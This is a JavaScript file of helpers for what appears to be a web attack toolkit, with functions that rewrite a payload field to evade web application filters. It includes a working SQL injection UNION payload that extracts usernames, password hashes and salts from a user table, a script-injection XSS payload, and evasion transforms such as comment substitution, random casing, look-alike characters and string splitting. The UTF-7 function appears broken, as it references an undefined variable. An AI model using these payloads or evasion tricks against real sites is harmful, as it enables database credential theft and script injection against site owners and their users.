
function space2comment() {
	var obj = document.getElementById('payload');
	var encode = obj.value;
  obj.value = encode.replace(/ /g,  "/**/");
}
function randomcase() {
  var obj = document.getElementById('payload');
  var encode = obj.value;
	content = encode.split('').map(function(v) {
  var change = Math.round(Math.random());
  return v = change ? v.toUpperCase() : v.toLowerCase();
}).join('');
obj.value=content
}
function charunicodeencode(){
    var obj = document.getElementById('payload');
    theString=obj.value;
    var unicodeString = '';
    for (var i=0; i < theString.length; i++) {
      var theUnicode = theString.charCodeAt(i).toString(16).toUpperCase();
      while (theUnicode.length < 4) {
        theUnicode = '0' + theUnicode;
      }
      theUnicode = '\\u' + theUnicode;
      unicodeString += theUnicode;
    }
    obj.value=unicodeString;
}
function charunicodedecode() {
   var obj = document.getElementById('payload');
   return obj.value.replace(/\\u[\dA-F]{4}/gi,
          function (match) {
               return String.fromCharCode(parseInt(match.replace(/\\u/g, ''), 16));
          });
}
function urlencode() {
	var obj = document.getElementById('payload');
	var unencoded = obj.value;
	obj.value = encodeURIComponent(unencoded).replace(/'/g,"%27").replace(/"/g,"%22");
}
function urldecode() {
	var obj = document.getElementById('payload');
	var encoded = obj.value;
	obj.value = decodeURIComponent(encoded.replace(/\+/g,  " "));
}
function base64encode() {
	var obj = document.getElementById('payload');
	var encoded = obj.value;
	obj.value = btoa(encoded);
}
function base64decode() {
	var obj = document.getElementById('payload');
	var encoded = obj.value;
	obj.value = atob(encoded);
}
function payloadex() {
	var obj = document.getElementById('payload');
	var encoded = obj.value;
	obj.value = "-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -";
}
function space2morecomment() {
	var obj = document.getElementById('payload');
	var encode = obj.value;
  obj.value = encode.replace(/ /g,  "/**_**/");
}
function unicodelt(){
	var obj= document.getElementById('payload');
	var encoded = obj.value;
  obj.value = encoded.replace(/</g,  "≤");
}
function unicodelt2(){
	var obj= document.getElementById('payload');
	var encoded = obj.value;
  obj.value = encoded.replace(/</g,  "≮");
}
function alertescape(){
	var obj= document.getElementById('payload');
	var encoded = obj.value;
	obj.value = encoded.replace(/alert/i,  "'a'+'l'+'e'+'r'+'t'");
}
function payloadexxss() {
	var obj = document.getElementById('payload');
	var encoded = obj.value;
	obj.value = '"><script>infinitum()<\/script>';
}
function utf7encode(){
	var obj= document.getElementById('payload');
	codepage=atob("PCVAY29kZXBhZ2U9NjUwMDAlPg==");
	var encoded = codepage+"<%"+utf7.encode(obj.value)+"%>";
  obj.value = atob(encode);
}
